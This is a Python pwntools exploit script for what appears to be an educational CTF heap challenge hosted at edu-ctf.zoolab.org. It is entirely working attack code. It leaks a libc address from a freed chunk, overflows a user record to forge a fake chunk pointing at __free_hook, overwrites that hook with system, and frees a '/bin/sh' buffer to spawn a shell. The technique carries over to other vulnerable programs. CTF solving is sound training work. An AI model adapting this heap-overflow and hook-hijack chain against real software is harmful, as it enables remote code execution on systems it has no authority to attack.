from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
ip = 'edu-ctf.zoolab.org'
port = 10008
local = False



def add_user(idx,name,passwd):
    s.sendlineafter(b'>','1')
    s.sendlineafter(b'>',str(idx))
    s.sendlineafter(b'>',str(name))
    s.sendlineafter(b'>',str(passwd))
    #print(s.recvuntil(b'1. ')[:-3])

def edit_data(idx,size,data):
    s.sendlineafter(b'>','2')
    s.sendlineafter(b'>',str(idx))
    s.sendlineafter(b'>',str(size))
    s.send(data)
    #print(s.recvuntil(b'1. ')[:-3])


def del_user(idx):
    s.sendlineafter(b'>','3')
    s.sendlineafter(b'>',str(idx))
def show_users():
    s.sendlineafter(b'>','4')
    return s.recvuntil(b'1. ')[:-3]

if local :
    s = process('./chal')
else:
    s = remote(ip,port)


edit_data(0,0x418,'admin')
add_user(1,'AAAAAAAA','aaaaaaaa')
edit_data(1,0x18,'AaAa')
add_user(2,'BBBBBBBB','bbbbbbbb')
del_user(0)

leak_data = show_users()
leak_addr = leak_data.split(b'\n')[1][6:12]
leak_addr = u64(leak_addr.ljust(8,b'\x00'))
print("leaked addr:",hex(leak_addr))

libc = leak_addr - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290

fake_chunk = flat(
    0          ,       0x31,
    b'CCCCCCCC',b'CCCCCCCC',
    b'CCCCCCCC',b'CCCCCCCC',
    free_hook,
)
data = b'/bin/sh\x00'.ljust(0x10,b'B')
edit_data(1,0x50,data+fake_chunk)
edit_data(2,0x8,p64(system))
#gdb.attach(s)
del_user(1)
s.interactive()

